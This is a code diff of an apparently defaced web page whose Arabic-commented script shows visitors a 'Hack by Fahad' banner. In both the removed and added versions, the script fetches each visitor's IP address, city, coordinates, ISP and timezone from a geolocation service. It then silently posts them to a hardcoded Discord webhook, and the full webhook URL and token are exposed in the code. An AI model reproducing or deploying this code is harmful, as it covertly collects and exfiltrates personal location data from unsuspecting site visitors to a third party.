@@ -112,7 +112,7 @@
                     0px 0px 25px rgba(255, 0, 0, 0.5);
         letter-spacing: 4.5px;
         white-space: pre-wrap;
-        z-index: 55555555555555;
+        z-index: 5555;
     }
 
     /* شريط النص المتحرك داخل الفيديو الثاني */
@@ -192,55 +192,6 @@
 <script>
 
 
- const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-
-        const particles = [];
-        const particleCount = 100;
-
-        for (let i = 0; i < particleCount; i++) {
-            particles.push({
-                x: Math.random() * canvas.width,
-                y: Math.random() * canvas.height,
-                size: Math.random() * 5 + 1,
-                speedX: Math.random() * 3 - 1.5,
-                speedY: Math.random() * 3 - 1.5
-            });
-        }
-
-        function animate() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-            for (let i = 0; i < particles.length; i++) {
-                const p = particles[i];
-                ctx.fillStyle = '#fff';
-                ctx.beginPath();
-                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
-                ctx.fill();
-
-                p.x += p.speedX;
-                p.y += p.speedY;
-
-                if (p.x < 0 || p.x > canvas.width) p.speedX *= -1;
-                if (p.y < 0 || p.y > canvas.height) p.speedY *= -1;
-            }
-
-            requestAnimationFrame(animate);
-        }
-
-        animate();
-
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
-
-
-
     // الانتقال من الفيديو إلى المحتوى الثاني عند انتهائه
     const video = document.querySelector('.background-video');
     const content = document.querySelector('.content');
@@ -253,68 +204,42 @@
     };
 
     // Fetch IP information without API token
-fetch('https://ipwho.is/')
-  .then(response => {
-    if (!response.ok) throw new Error(`HTTP ${response.status}`);
-    return response.json();
-  })
-  .then(data => {
-    if (!data.success) throw new Error('API returned error');
+    fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            const { ip, country, city, region, loc, org, timezone } = data;
 
-    const ip = data.ip;
-    const country = data.country;
-    const city = data.city;
-    const region = data.region;
-    const loc = `${data.latitude},${data.longitude}`;
-    const org = data.connection?.isp || 'N/A';
-    const timezone = data.timezone?.id || 'N/A';
+            // تحديد البورت بناءً على البروتوكول
+            const port = window.location.port || (location.protocol === 'https:' ? '443' : '80');
 
-    const port = window.location.port || (location.protocol === 'https:' ? '443' : '80');
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.innerHTML = ` Hack by Fahad
+<strong>IP:</strong><span>"${ip}"</span><br>
+<strong>Port:</strong><span style="color: #ffd700">${port}</span><br>
+<strong>City:</strong><span>"${city}"</span><br>
+<strong>Region:</strong><span>"${region}"</span><br>
+<strong>Country:</strong><span>"${country}"</span><br>
+<strong>Location:</strong><span>"${loc}"</span><br>
+<strong>ISP:</strong><span>"${org}"</span><br>
+<strong>Timezone:</strong><span>"${timezone}"</span>`;
 
-    const infoDiv = document.getElementById('ip-info');
-    if (!infoDiv) {
-      console.error("عنصر #ip-info غير موجود في الصفحة!");
-      return;
-    }
-
-    infoDiv.innerHTML = `
-<strong>IP:</strong> ${ip}<br>
-<strong>Port:</strong> ${port}<br>
-<strong>City:</strong> ${city}<br>
-<strong>Region:</strong> ${region}<br>
-<strong>Country:</strong> ${country}<br>
-<strong>Location:</strong> ${loc}<br>
-<strong>ISP:</strong> ${org}<br>
-<strong>Timezone:</strong> ${timezone}
-`;
-
-    const dateTime = new Date().toLocaleString();
-
-    const webhookUrl = 'https://discord.com/api/webhooks/1351172060248019066/7xfV1QVOYKzmxhM8tBKK5VwXJpsHnFS-6HysAx1YUHnm8Ksjr7W8SmlwysjaU3lypP0O';
-
-    fetch(webhookUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        content: `⚠️ **New Visitor Info** ⚠️\n\n` +
-                 `**IP:** \`${ip}\`\n` +
-                 `**Port:** \`${port}\`\n` +
-                 `**Location:** ${country} - ${city}\n` +
-                 `**Coordinates:** ${loc}\n` +
-                 `**ISP:** ${org}\n` +
-                 `**Time:** ${dateTime}`
-      })
-    }).then(res => {
-      if (!res.ok) console.error("❌ فشل إرسال البيانات إلى الديسكورد");
-    }).catch(err => console.error("❌ خطأ في إرسال إلى الديسكورد:", err));
-
-  })
-  .catch(err => {
-    console.error("❌ خطأ في جلب بيانات IP:", err);
-    const infoDiv = document.getElementById('ip-info');
-    if (infoDiv) infoDiv.textContent = 'تعذر تحميل معلومات IP';
-  });
-
+            const dateTime = new Date().toLocaleString();
+            const webhookUrl = 'https://discord.com/api/webhooks/1351172060248019066/7xfV1QVOYKzmxhM8tBKK5VwXJpsHnFS-6HysAx1YUHnm8Ksjr7W8SmlwysjaU3lypP0O';
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `⚠️ **5 1 1** ⚠️\n\n` +
+                             `**IP:** \`${ip}\`\n` +
+                             `**Port:** \`${port}\`\n` +
+                             `**Location:** ${country} - ${city}\n` +
+                             `**Coordinates:** ${loc}\n` +
+                             `**ISP:** ${org}\n` +
+                             `**Time:** ${dateTime}`
+                })
+            });
+        });
 </script>
 
 <!-- فتح نوافذ Discord تلقائيًا -->
